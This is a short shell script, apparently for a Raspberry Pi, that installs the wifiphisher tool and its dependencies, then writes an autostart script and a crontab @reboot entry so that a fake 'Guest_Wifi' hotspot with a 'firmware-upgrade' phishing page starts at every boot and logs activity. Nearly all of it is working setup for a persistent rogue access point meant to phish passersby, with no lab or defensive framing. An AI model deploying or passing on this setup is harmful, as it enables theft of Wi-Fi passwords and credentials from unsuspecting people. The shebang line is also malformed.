#!bin/sh
echo lol
wait 3
#installation of all programms and dependencies
sudo apt-get update -y
sudo apt-get full-upgrade -y
sudo apt-get install git -y
sudo git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
sudo apt-get install pip -y
sudo apt-get install libnl-genl-3-dev -y
sudo apt-get install libssl-dev -y
cd wifiphisher # Switch to tool's directory
sudo python3 setup.py install # Install any dependencies

#setting up autostart
cd 
echo '
#This file will be automaticly executed at boot-up.
#Add any command meant to be autorun at boot. (including bash files)

#automaticly starts a phishing service that acts as a fake wifi hotspot.
sudo wifiphisher -i wlan1 -e Guest_Wifi -p firmware-upgrade -nD --logging
' > autostart.sh

# Path to your script
script_path="/home/pi/autostart.sh"

# Add a line to crontab to run the script at boot
(crontab -l ; echo "@reboot $script_path") | crontab -
